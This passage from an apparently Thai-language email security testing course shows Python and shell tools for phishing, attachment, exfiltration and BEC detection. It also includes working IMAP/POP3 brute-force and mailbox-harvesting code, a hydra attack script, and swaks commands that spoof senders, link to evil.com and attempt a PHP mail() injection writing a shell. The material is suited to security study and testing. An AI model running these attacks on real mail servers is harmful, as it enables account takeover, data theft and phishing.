        urls = re.findall(r'https?://[^\s<>"]+', body)
        for url in urls:
            url_analysis = self.analyze_url(url)
            if url_analysis['risk_score'] > 20:
                results['suspicious_links'].append(url_analysis)
        
        # Check for credential requests
        cred_patterns = [
            r'enter.*password', r'type.*username', r'provide.*credentials',
            r'social security', r'credit card', r'bank account'
        ]
        for pattern in cred_patterns:
            if re.search(pattern, body_lower):
                results['credential_requests'].append(pattern)
                results['risk_score'] += 15
        
        # Check for form elements
        if re.search(r'<form|<input|<button', body, re.IGNORECASE):
            results['forms_detected'] = True
            results['risk_score'] += 20
        
        results['risk_score'] = min(results['risk_score'], 100)
        return results
    
    def identify_phishing_kit(self, html_content: str) -> Dict:
        """ระบุ phishing kit จาก HTML content"""
        kit_info = {
            'kit_name': None,
            'target_brand': None,
            'features': [],
            'indicators': []
        }
        
        # Common phishing kit signatures
        kit_signatures = {
            '16Shop': ['16shop', 'apple/16shop', 'paypal/16shop'],
            'LogoKit': ['logokit', 'logo-kit'],
            'Robin Banks': ['robin-banks', 'robinbanks'],
            'Zerokit': ['zero-kit', 'zerokit'],
        }
        
        for kit_name, sigs in kit_signatures.items():
            for sig in sigs:
                if sig.lower() in html_content.lower():
                    kit_info['kit_name'] = kit_name
                    kit_info['indicators'].append(f'Found signature: {sig}')
        
        # Detect target brand from content
        brand_patterns = {
            'PayPal': r'paypal|pplogon',
            'Microsoft': r'microsoft|Office 365|outlook',
            'Apple': r'apple.com/icloud|appleid',
            'Google': r'google.*sign.in|gmail.*login',
            'Amazon': r'amazon.*verify|aws.*login',
        }
        
        for brand, pattern in brand_patterns.items():
            if re.search(pattern, html_content, re.IGNORECASE):
                kit_info['target_brand'] = brand
                break
        
        # Check for evasion techniques
        if re.search(r'bot|crawler|spider', html_content, re.IGNORECASE):
            kit_info['features'].append('Bot detection')
        if re.search(r'vpn|proxy|tor', html_content, re.IGNORECASE):
            kit_info['features'].append('VPN/Proxy detection')
        if re.search(r'(function|eval|atob|fromCharCode)', html_content):
            kit_info['features'].append('JavaScript obfuscation')
        
        return kit_info
```

---

## Step 386: Email Attachment Analysis

```python
import email
import os
import magic
import hashlib
import zipfile
import struct
from typing import Dict, List, Optional, Tuple
from pathlib import Path

class EmailAttachmentAnalyzer:
    """วิเคราะห์ email attachments หา malware"""
    
    DANGEROUS_EXTENSIONS = [
        '.exe', '.dll', '.scr', '.vbs', '.js', '.jse', '.wsh', '.wsf',
        '.hta', '.cmd', '.bat', '.ps1', '.psm1', '.psd1', '.msi', '.msp',
        '.jar', '.lnk', '.pif', '.com', '.reg', '.inf'
    ]
    
    DOCUMENT_MACROS = ['.doc', '.xls', '.ppt', '.docm', '.xlsm', '.pptm', '.xlsb']
    
    DOUBLE_EXTENSION_PATTERNS = [
        r'\.(pdf|doc|xls|txt)\.(exe|scr|bat|com|vbs)$',
        r'\.exe\.pdf$',
    ]
    
    def extract_attachments(self, raw_email: str, output_dir: str) -> List[Dict]:
        """Extract attachments จาก email"""
        msg = email.message_from_string(raw_email)
        attachments = []
        
        os.makedirs(output_dir, exist_ok=True)
        
        for part in msg.walk():
            if part.get_content_maintype() == 'multipart':
                continue
            if part.get('Content-Disposition') is None:
                continue
            
            filename = part.get_filename()
            if filename:
                # Decode encoded filename
                import email.header
                decoded = email.header.decode_header(filename)
                filename = ''.join(
                    t.decode(e or 'utf-8') if isinstance(t, bytes) else t 
                    for t, e in decoded
                )
                
                filepath = os.path.join(output_dir, filename)
                content = part.get_payload(decode=True)
                
                with open(filepath, 'wb') as f:
                    f.write(content)
                
                attachment_info = self.analyze_attachment(filepath)
                attachment_info['original_filename'] = filename
                attachments.append(attachment_info)
                print(f"Extracted: {filename} ({len(content)} bytes)")
        
        return attachments
    
    def analyze_attachment(self, filepath: str) -> Dict:
        """วิเคราะห์ attachment file"""
        info = {
            'path': filepath,
            'filename': os.path.basename(filepath),
            'size': os.path.getsize(filepath),
            'md5': None,
            'sha256': None,
            'file_type': None,
            'extension': None,
            'risks': [],
            'risk_score': 0
        }
        
        # Calculate hashes
        with open(filepath, 'rb') as f:
            content = f.read()
        info['md5'] = hashlib.md5(content).hexdigest()
        info['sha256'] = hashlib.sha256(content).hexdigest()
        
        # File extension
        ext = Path(filepath).suffix.lower()
        info['extension'] = ext
        
        # True file type via magic bytes
        try:
            info['file_type'] = magic.from_file(filepath)
        except Exception:
            info['file_type'] = 'Unknown'
        
        # Check dangerous extension
        if ext in self.DANGEROUS_EXTENSIONS:
            info['risks'].append(f'Dangerous extension: {ext}')
            info['risk_score'] += 50
        
        # Check document with macros
        if ext in self.DOCUMENT_MACROS:
            if self._check_macro_presence(filepath, content):
                info['risks'].append('Contains VBA macros')
                info['risk_score'] += 40
        
        # Check double extension
        for pattern in self.DOUBLE_EXTENSION_PATTERNS:
            import re
            if re.search(pattern, info['filename'], re.IGNORECASE):
                info['risks'].append(f'Double extension: {info["filename"]}')
                info['risk_score'] += 60
        
        # Check extension vs magic bytes mismatch
        if ext == '.pdf' and not content.startswith(b'%PDF'):
            info['risks'].append('File claims to be PDF but magic bytes differ')
            info['risk_score'] += 45
        
        # Check for embedded PE
        if b'MZ' in content[:2] and ext not in ['.exe', '.dll']:
            info['risks'].append('Contains embedded executable (MZ header)')
            info['risk_score'] += 55
        
        # Password protected ZIP (can hide malware)
        if ext == '.zip':
            try:
                zf = zipfile.ZipFile(filepath)
                for zi in zf.infolist():
                    if zi.flag_bits & 0x1:  # encrypted
                        info['risks'].append('Password-protected ZIP (suspicious)')
                        info['risk_score'] += 20
                        break
                    inner_ext = Path(zi.filename).suffix.lower()
                    if inner_ext in self.DANGEROUS_EXTENSIONS:
                        info['risks'].append(f'ZIP contains executable: {zi.filename}')
                        info['risk_score'] += 45
            except Exception:
                pass
        
        # Check for polyglot files
        if content.startswith(b'%PDF') and b'PK' in content[:4096]:
            info['risks'].append('Possible PDF+ZIP polyglot')
            info['risk_score'] += 40
        
        info['risk_score'] = min(info['risk_score'], 100)
        return info
    
    def _check_macro_presence(self, filepath: str, content: bytes) -> bool:
        """ตรวจหา VBA macros ใน Office documents"""
        # OLE compound document signature
        if content[:8] == b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1':
            # Old .doc/.xls format - could have macros
            return b'VBA' in content or b'AutoOpen' in content or b'Auto_Open' in content
        
        # OOXML (.docm, .xlsm) - ZIP with vbaProject.bin
        try:
            with zipfile.ZipFile(filepath) as zf:
                names = zf.namelist()
                return any('vbaProject' in name or 'vbaData' in name for name in names)
        except Exception:
            pass
        
        return False
    
    def check_virustotal(self, sha256: str, api_key: str) -> Dict:
        """ตรวจสอบ hash กับ VirusTotal"""
        import urllib.request
        import json
        
        url = f'https://www.virustotal.com/vtapi/v2/file/report?apikey={api_key}&resource={sha256}'
        
        try:
            with urllib.request.urlopen(url) as response:
                result = json.loads(response.read())
            
            if result.get('response_code') == 1:
                return {
                    'found': True,
                    'positives': result.get('positives', 0),
                    'total': result.get('total', 0),
                    'permalink': result.get('permalink', '')
                }
            else:
                return {'found': False}
        except Exception as e:
            return {'error': str(e)}
```

---

## Step 387: IMAP/POP3 Security Testing

```python
import imaplib
import poplib
import ssl
import socket
from typing import List, Dict, Optional, Tuple

class IMAPPOPTester:
    """ทดสอบความปลอดภัยของ IMAP และ POP3 services"""
    
    def test_imap_authentication(self, host: str, port: int = 993,
                                 use_ssl: bool = True) -> Dict:
        """ทดสอบ IMAP authentication mechanisms"""
        result = {
            'host': host,
            'port': port,
            'ssl': use_ssl,
            'capabilities': [],
            'auth_mechanisms': [],
            'issues': []
        }
        
        try:
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                M = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
            else:
                M = imaplib.IMAP4(host, port)
            
            # Get capabilities
            typ, caps = M.capability()
            if caps:
                cap_str = caps[0].decode('utf-8', errors='ignore')
                result['capabilities'] = cap_str.split()
                
                for cap in result['capabilities']:
                    if cap.startswith('AUTH='):
                        result['auth_mechanisms'].append(cap[5:])
                
                # Check for weak mechanisms
                if 'AUTH=PLAIN' in cap_str and not use_ssl:
                    result['issues'].append('AUTH PLAIN without SSL - credentials sent cleartext!')
                if 'AUTH=LOGIN' in cap_str and not use_ssl:
                    result['issues'].append('AUTH LOGIN without SSL - credentials sent cleartext!')
                if 'LOGINDISABLED' not in cap_str and not use_ssl:
                    result['issues'].append('LOGIN not disabled on cleartext connection')
            
            M.logout()
        except Exception as e:
            result['issues'].append(f'Connection error: {str(e)}')
        
        return result
    
    def brute_force_imap(self, host: str, port: int, 
                         username: str, passwords: List[str],
                         use_ssl: bool = True) -> Optional[str]:
        """Brute force IMAP credentials"""
        for password in passwords:
            try:
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    M = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
                else:
                    M = imaplib.IMAP4(host, port)
                
                M.login(username, password)
                M.logout()
                print(f"IMAP SUCCESS: {username}:{password}")
                return password
                
            except imaplib.IMAP4.error:
                pass
            except Exception:
                break
        
        return None
    
    def harvest_emails_imap(self, host: str, port: int,
                             username: str, password: str,
                             use_ssl: bool = True) -> List[Dict]:
        """ดึง emails จาก IMAP server หลังจาก compromise"""
        emails = []
        
        try:
            if use_ssl:
                M = imaplib.IMAP4_SSL(host, port)
            else:
                M = imaplib.IMAP4(host, port)
            
            M.login(username, password)
            
            # List all folders
            typ, folders = M.list()
            print(f"Mailboxes: {[f.decode() for f in folders]}")
            
            # Select INBOX
            M.select('INBOX')
            
            # Search for all messages
            typ, data = M.search(None, 'ALL')
            mail_ids = data[0].split()
            
            print(f"Found {len(mail_ids)} emails")
            
            # Fetch latest 10 emails
            for mail_id in mail_ids[-10:]:
                typ, msg_data = M.fetch(mail_id, '(BODY[HEADER.FIELDS (FROM TO SUBJECT DATE)])')
                if msg_data[0]:
                    header = msg_data[0][1].decode('utf-8', errors='ignore')
                    emails.append({'id': mail_id.decode(), 'header': header})
            
            # Search for sensitive emails
            sensitive_keywords = ['password', 'credential', 'secret', 'key', 'token']
            for keyword in sensitive_keywords:
                typ, data = M.search(None, f'BODY "{keyword}"')
                if data[0]:
                    ids = data[0].split()
                    print(f"Emails with '{keyword}': {len(ids)}")
            
            M.logout()
        except Exception as e:
            print(f"IMAP error: {e}")
        
        return emails
    
    def test_pop3(self, host: str, port: int = 995, 
                  use_ssl: bool = True) -> Dict:
        """ทดสอบ POP3 security"""
        result = {'host': host, 'port': port, 'issues': []}
        
        try:
            if use_ssl:
                M = poplib.POP3_SSL(host, port)
            else:
                M = poplib.POP3(host, port)
                # Check for STLS support
                try:
                    M.stls()
                    result['starttls'] = True
                except poplib.error_proto:
                    result['starttls'] = False
                    result['issues'].append('No STARTTLS support on cleartext POP3')
            
            welcome = M.getwelcome().decode('utf-8', errors='ignore')
            result['banner'] = welcome
            
            # Check if banner leaks software version
            if re.search(r'v\d+\.\d+|version|courier|dovecot|cyrus', 
                        welcome, re.IGNORECASE):
                result['issues'].append(f'Banner leaks software info: {welcome[:50]}')
            
            M.quit()
        except Exception as e:
            result['issues'].append(f'Error: {str(e)}')
        
        return result


# imap_pop3_attack.sh
IMAP_ATTACK_SCRIPT = '''
#!/bin/bash
# IMAP/POP3 Attack Script

TARGET="$1"
USER="$2"

# Test IMAP
echo "[*] Testing IMAP (143):"
echo -e "a001 CAPABILITY\na002 LOGOUT" | nc -w5 $TARGET 143

# Test IMAPS
echo "[*] Testing IMAPS (993):"
openssl s_client -connect $TARGET:993 -quiet 2>/dev/null <<< $'a001 CAPABILITY\na002 LOGOUT'

# Brute force IMAP
echo "[*] IMAP brute force:"
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt imap://$TARGET

# Test POP3
echo "[*] Testing POP3 (110):"
echo -e "CAPA\nQUIT" | nc -w5 $TARGET 110

# Brute force POP3
echo "[*] POP3 brute force:"
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt pop3://$TARGET

# nmap scripts
nmap -p110,143,993,995 --script imap-capabilities,pop3-capabilities,\
imap-brute,pop3-brute $TARGET
'''
```

---

## Step 388: Email-based Data Exfiltration Detection

```python
import re
import base64
import gzip
import zlib
from typing import Dict, List, Optional, Tuple
from email import policy
from email.parser import Parser
from dataclasses import dataclass

@dataclass
class ExfilIndicator:
    method: str
    confidence: float
    data_size: int
    description: str

class EmailExfilDetector:
    """ตรวจหา data exfiltration ผ่านทาง email"""
    
    MAX_NORMAL_ATTACHMENT_SIZE = 25 * 1024 * 1024  # 25MB
    SUSPICIOUS_ATTACHMENT_SIZE = 100 * 1024 * 1024  # 100MB
    
    def detect_covert_channels(self, msg_raw: str) -> List[ExfilIndicator]:
        """ตรวจหา covert channels ใน email"""
        indicators = []
        msg = Parser(policy=policy.default).parsestr(msg_raw)
        
        # 1. Check Subject line encoding
        subject = msg.get('Subject', '')
        if self._is_base64_like(subject) or self._is_hex_encoded(subject):
            indicators.append(ExfilIndicator(
                method='subject_encoding',
                confidence=0.7,
                data_size=len(subject),
                description=f'Subject appears encoded: {subject[:50]}'
            ))
        
        # 2. Check custom headers
        for header_name, header_val in msg.items():
            if header_name.startswith('X-'):
                if self._is_base64_like(header_val) or len(header_val) > 500:
                    indicators.append(ExfilIndicator(
                        method='custom_header_exfil',
                        confidence=0.6,
                        data_size=len(header_val),
                        description=f'Custom header {header_name} has encoded/large value'
                    ))
        
        # 3. Check whitespace steganography in body
        body = self._get_body(msg)
        if body:
            ws_data = self._check_whitespace_steg(body)
            if ws_data:
                indicators.append(ExfilIndicator(
                    method='whitespace_steganography',
                    confidence=0.8,
                    data_size=len(ws_data),
                    description='Data encoded in whitespace patterns'
                ))
        
        # 4. Large attachments
        for part in msg.walk():
            if part.get_content_disposition() == 'attachment':
                payload = part.get_payload(decode=True)
                if payload and len(payload) > self.SUSPICIOUS_ATTACHMENT_SIZE:
                    indicators.append(ExfilIndicator(
                        method='large_attachment',
                        confidence=0.5,
                        data_size=len(payload),
                        description=f'Unusually large attachment: {len(payload)/1024/1024:.1f}MB'
                    ))
        
        # 5. Check for encrypted/compressed data in body
        if body:
            if self._detect_encryption_markers(body):
                indicators.append(ExfilIndicator(
                    method='encrypted_content',
                    confidence=0.65,
                    data_size=len(body),
                    description='Body contains markers of encryption/compression'
                ))
        
        return indicators
    
    def detect_mass_exfil_campaign(self, emails: List[Dict]) -> Dict:
        """ตรวจหา mass exfiltration campaign จาก email logs"""
        analysis = {
            'total_emails': len(emails),
            'external_recipients': {},
            'large_attachments': [],
            'after_hours_sends': [],
            'suspicious_subjects': [],
            'alerts': []
        }
        
        for email_info in emails:
            sender = email_info.get('from', '')
            recipients = email_info.get('to', '').split(',')
            subject = email_info.get('subject', '')
            size = email_info.get('size', 0)
            timestamp = email_info.get('timestamp')
            
            # Track external recipients
            for recipient in recipients:
                domain = re.search(r'@([\w.-]+)', recipient)
                if domain:
                    ext_domain = domain.group(1)
                    if ext_domain not in analysis['external_recipients']:
                        analysis['external_recipients'][ext_domain] = 0
                    analysis['external_recipients'][ext_domain] += 1
            
            # Flag large attachments
            if size > self.MAX_NORMAL_ATTACHMENT_SIZE:
                analysis['large_attachments'].append({
                    'from': sender,
                    'to': recipients,
                    'size': size,
                    'subject': subject
                })
            
            # Check for suspicious subjects
            exfil_subjects = [
                r'\d{4}-\d{2}-\d{2}',  # Date pattern
                r'^[A-Z0-9]{8,}$',  # Random looking
                r'test|backup|archive|export|data',
            ]
            for pattern in exfil_subjects:
                if re.search(pattern, subject, re.IGNORECASE):
                    analysis['suspicious_subjects'].append(subject)
                    break
        
        # Generate alerts
        for domain, count in analysis['external_recipients'].items():
            if count > 50:
                analysis['alerts'].append(
                    f'High volume to {domain}: {count} emails'
                )
        
        if len(analysis['large_attachments']) > 5:
            analysis['alerts'].append(
                f'{len(analysis["large_attachments"])} large attachments detected'
            )
        
        return analysis
    
    def _is_base64_like(self, text: str) -> bool:
        """ตรวจสอบว่า text คล้าย base64 หรือไม่"""
        b64_chars = set('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=')
        if len(text) < 20:
            return False
        ratio = sum(1 for c in text if c in b64_chars) / len(text)
        return ratio > 0.95 and len(text) % 4 == 0
    
    def _is_hex_encoded(self, text: str) -> bool:
        """ตรวจสอบว่า text เป็น hex-encoded"""
        hex_chars = set('0123456789abcdefABCDEF')
        if len(text) < 16:
            return False
        ratio = sum(1 for c in text if c in hex_chars) / len(text)
        return ratio > 0.95 and len(text) % 2 == 0
    
    def _check_whitespace_steg(self, text: str) -> Optional[bytes]:
        """ตรวจหา whitespace steganography (spaces/tabs encoding)"""
        lines = text.split('\n')
        bits = []
        
        for line in lines:
            trailing = line[len(line.rstrip()):]
            for char in trailing:
                if char == ' ':
                    bits.append('0')
                elif char == '\t':
                    bits.append('1')
        
        if len(bits) > 8:
            # Try to decode as binary
            byte_str = ''.join(bits)
            result = bytes([
                int(byte_str[i:i+8], 2) 
                for i in range(0, len(byte_str)-7, 8)
            ])
            # Check if result looks like printable text
            printable = sum(1 for b in result if 32 <= b <= 126)
            if printable / len(result) > 0.7:
                return result
        
        return None
    
    def _detect_encryption_markers(self, text: str) -> bool:
        """ตรวจหา markers ของ encrypted/compressed content"""
        markers = [
            b'\x1f\x8b',  # gzip
            b'PK',        # ZIP
            b'Salted__',  # OpenSSL encryption
            b'-----BEGIN',  # PEM
        ]
        
        text_bytes = text.encode('utf-8', errors='ignore')
        for marker in markers:
            if marker in text_bytes:
                return True
        
        return False
    
    def _get_body(self, msg) -> Optional[str]:
        """ดึง email body"""
        for part in msg.walk():
            if part.get_content_type() == 'text/plain':
                return part.get_payload(decode=True).decode('utf-8', errors='ignore')
        return None
```

---

## Step 389: Business Email Compromise (BEC) Analysis

```python
import re
import json
from typing import Dict, List, Optional
from dataclasses import dataclass, field

@dataclass
class BECPattern:
    attack_type: str
    indicators: List[str]
    risk_level: str
    description: str

class BECAnalyzer:
    """วิเคราะห์และตรวจหา Business Email Compromise"""
    
    BEC_ATTACK_TYPES = {
        'ceo_fraud': {
            'description': 'Impersonation of CEO/executive to request urgent wire transfer',
            'indicators': [
                'urgent wire transfer',
                'do not discuss with',
                'confidential acquisition',
                'approved by ceo',
                'need this done today'
            ]
        },
        'vendor_fraud': {
            'description': 'Impersonation of vendor to change bank account details',
            'indicators': [
                'updated banking information',
                'new account number',
                'change of bank',
                'new payment details',
                'please update your records'
            ]
        },
        'payroll_diversion': {
            'description': 'Impersonation of employee to change direct deposit',
            'indicators': [
                'update direct deposit',
                'change bank account',
                'new checking account',
                'payroll update request'
            ]
        },
        'attorney_impersonation': {
            'description': 'Impersonation of lawyer/legal counsel',
            'indicators': [
                'legal matter',
                'acquisition is confidential',
                'attorney client privilege',
                'do not discuss with staff'
            ]
        },
        'gift_card_scam': {
            'description': 'Request to purchase gift cards urgently',
            'indicators': [
                'purchase gift cards',
                'itunes gift card',
                'google play card',
                'amazon gift card',
                'send me the codes'
            ]
        }
    }
    
    def analyze_email_for_bec(self, email_headers: Dict, body: str) -> Dict:
        """วิเคราะห์ email หา BEC patterns"""
        results = {
            'bec_detected': False,
            'attack_types': [],
            'indicators_found': [],
            'spoofing_detected': False,
            'risk_score': 0,
            'recommended_actions': []
        }
        
        body_lower = body.lower()
        
        # Check for BEC patterns
        for attack_type, pattern_info in self.BEC_ATTACK_TYPES.items():
            matched = []
            for indicator in pattern_info['indicators']:
                if indicator.lower() in body_lower:
                    matched.append(indicator)
            
            if matched:
                results['attack_types'].append(attack_type)
                results['indicators_found'].extend(matched)
                results['risk_score'] += len(matched) * 15
        
        # Check spoofing indicators
        from_addr = email_headers.get('from', '')
        reply_to = email_headers.get('reply-to', '')
        
        if reply_to and from_addr:
            from_domain = re.search(r'@([\w.-]+)', from_addr)
            reply_domain = re.search(r'@([\w.-]+)', reply_to)
            
            if from_domain and reply_domain:
                if from_domain.group(1) != reply_domain.group(1):
                    results['spoofing_detected'] = True
                    results['risk_score'] += 30
                    results['indicators_found'].append(
                        f"Reply-To domain ({reply_domain.group(1)}) differs from From domain ({from_domain.group(1)})"
                    )
        
        # Check urgency indicators
        urgency_words = [
            'urgent', 'asap', 'immediately', 'right now',
            'today', 'within the hour', 'emergency'
        ]
        urgency_count = sum(1 for w in urgency_words if w in body_lower)
        if urgency_count >= 2:
            results['risk_score'] += urgency_count * 5
            results['indicators_found'].append(f'{urgency_count} urgency keywords found')
        
        # Determine if BEC
        results['bec_detected'] = results['risk_score'] >= 30
        
        # Recommend actions
        if results['bec_detected']:
            results['recommended_actions'] = [
                'Verify request via phone call to known number',
                'Do NOT use contact info from the email',
                'Escalate to security team immediately',
                'Do not transfer funds or change payment details',
                'Preserve email headers as evidence'
            ]
        
        return results
    
    def build_bec_defenses(self) -> Dict:
        """สร้าง playbook สำหรับป้องกัน BEC"""
        return {
            'technical_controls': [
                'Implement DMARC p=reject policy',
                'Enable email authentication (SPF/DKIM)',
                'Deploy email security gateway with BEC detection',
                'Enable multi-factor authentication on email accounts',
                'Implement email display name spoofing protection',
                'Create transport rules to tag external emails',
                'Block lookalike domains',
            ],
            'process_controls': [
                'Dual approval for wire transfers above threshold',
                'Verify bank account changes via callback to known number',
                'Implement change freeze during known attack campaigns',
                'Train employees on BEC recognition',
                'Establish verbal confirmation protocol for financial changes',
            ],
            'detection_rules': [
                'Alert on emails with executive name in From but external domain',
                'Alert on invoice/payment keywords from new senders',
                'Alert on direct deposit change requests',
                'Alert on emails requesting gift card purchases',
                'Alert on Reply-To domain mismatch with From domain',
            ]
        }
    
    def simulate_bec_email(self, target_company: str, ceo_name: str,
                           target_employee: str, amount: float) -> str:
        """สร้าง simulated BEC email สำหรับ awareness training"""
        return f"""From: {ceo_name} <ceo-{target_company.lower()[:5]}@gmail.com>
To: {target_employee}
Subject: URGENT - Confidential Wire Transfer Required
Reply-To: ceo.{target_company.lower()}@secure-mail.info

Hi,

I'm currently in a confidential meeting regarding our acquisition of a competitor.
This is extremely time-sensitive and I need you to process a wire transfer of
${amount:,.2f} to our attorney's escrow account.

This transaction must be completed TODAY and kept strictly confidential.
Please do not discuss this with anyone else in the office.

I'll explain everything once the deal is finalized. Just send me the confirmation.

Best,
{ceo_name}
CEO, {target_company}

[SIMULATION - This is a BEC phishing awareness test]
"""
```

---

## Step 390: Email Security Tools (swaks, Gophish, SET)

```bash
#!/bin/bash
# Email Security Testing Tools Reference

# ============================================================
# SWAKS - Swiss Army Knife for SMTP
# ============================================================

echo "=== SWAKS Examples ==="

# Basic email test
swaks --to victim@target.com --server mail.target.com

# Send with spoofed From
swaks --to victim@target.com \
      --from ceo@target.com \
      --header "Subject: Urgent Request" \
      --body "Please click: http://evil.com" \
      --server mail.target.com

# Test with AUTH
swaks --to victim@target.com \
      --from attacker@evil.com \
      --server mail.target.com \
      --auth LOGIN \
      --auth-user attacker@evil.com \
      --auth-password 'P@ssw0rd'

# Test STARTTLS
swaks --to victim@target.com \
      --server mail.target.com \
      --port 587 \
      --tls

# Send with attachment
swaks --to victim@target.com \
      --server mail.target.com \
      --attach /tmp/payload.pdf \
      --attach-type 'application/pdf' \
      --body "Please review the attached document."

# Test open relay
swaks --to external@gmail.com \
      --from external@yahoo.com \
      --server mail.target.com

# PHP mail() injection test
swaks --to victim@target.com \
      --from 'attacker@evil.com" -X/tmp/shell.php"' \
      --server mail.target.com

# ============================================================
# Gophish - Phishing Framework
# ============================================================

echo "=== Gophish Setup ==="

# Download and start Gophish
wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip
unzip gophish-linux-64bit.zip
chmod +x gophish
./gophish &

# Access admin panel at https://localhost:3333
# Default credentials: admin / gophish

# Gophish API usage
curl -k -X GET https://localhost:3333/api/groups/?api_key=API_KEY
curl -k -X GET https://localhost:3333/api/campaigns/?api_key=API_KEY
curl -k -X GET https://localhost:3333/api/results/?api_key=API_KEY

# ============================================================
# Social Engineering Toolkit (SET)
# ============================================================

echo "=== SET Email Attacks ==="

# Launch SET
# setoolkit

# SET Menu Navigation for Email Attack:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 1) Web Templates
# Choose target (Google, Gmail, Facebook, etc.)

# SET Spear-Phishing:
# 1) Social-Engineering Attacks
# 1) Spear-Phishing Attack Vectors
# 1) Perform a Mass Email Attack

# ============================================================
# Email Harvesting
# ============================================================

echo "=== Email Harvesting Tools ==="

# theHarvester
theHarvester -d target.com -l 500 -b all

# Hunter.io API
curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=API_KEY"

# ============================================================
# Email Header Analysis Tools
# ============================================================

# Parse email headers manually
python3 << 'EOF'
import sys
from email import policy
from email.parser import Parser

raw_email = open('/tmp/suspicious.eml').read()
msg = Parser(policy=policy.default).parsestr(raw_email)

print("From:", msg['From'])
print("To:", msg['To'])
print("Subject:", msg['Subject'])
print("Authentication-Results:", msg['Authentication-Results'])
print("Received headers:")
for r in msg.get_all('Received', []):
    print(f"  {r[:100]}")
EOF

# MXToolbox equivalent checks
dig TXT example.com | grep -E 'spf|v=spf'
dig TXT _dmarc.example.com
dig MX example.com

# ============================================================
# Email Security Assessment Summary
# ============================================================

echo "=== Email Security Assessment Checklist ==="
cat << 'EOF'
[RECON]
□ MX record enumeration
□ SMTP banner grabbing
□ Open relay testing
□ User enumeration (VRFY/EXPN/RCPT)
□ SMTP authentication mechanisms

[AUTHENTICATION]
□ SPF record check (policy strength)
□ DKIM selector discovery and key analysis
□ DMARC policy check (none/quarantine/reject)
□ DMARC reporting configured?
□ BIMI record check

[SERVER CONFIGURATION]
□ STARTTLS enforcement
□ TLS version and ciphers
□ Certificate validity
□ Credential brute force resistance
□ Rate limiting on failed auth

[CONTENT FILTERING]
□ Attachment filtering
□ URL filtering/rewriting
□ Spam filtering effectiveness
□ BEC detection capability
□ Phishing detection

[MONITORING]
□ DMARC aggregate reports configured
□ Email security gateway logs
□ Failed authentication alerts
□ Large attachment alerts
□ External email tagging
EOF
```

---

## สรุป Part 39

Part นี้ครอบคลุม Email Security Testing ครบถ้วน:
- **Step 381**: SMTP Reconnaissance - banner grabbing, MX records, open relay testing, user enumeration
- **Step 382**: Email Header Analysis - Received header parsing, spoofing detection, authentication results
- **Step 383**: SPF/DKIM/DMARC Testing - configuration analysis, weakness identification, recommendations
- **Step 384**: Mail Server Exploitation - SMTP injection, open relay exploitation, credential brute force
- **Step 385**: Phishing Infrastructure Analysis - URL analysis, homograph attacks, phishing kit detection
- **Step 386**: Email Attachment Analysis - malware detection, magic bytes, macro detection, VirusTotal
- **Step 387**: IMAP/POP3 Security Testing - authentication bypass, credential harvesting, brute force
- **Step 388**: Email Exfiltration Detection - covert channels, whitespace steganography, mass exfil detection
- **Step 389**: BEC Analysis - CEO fraud, vendor fraud patterns, defense playbook
- **Step 390**: Email Security Tools - swaks, Gophish, SET, theHarvester
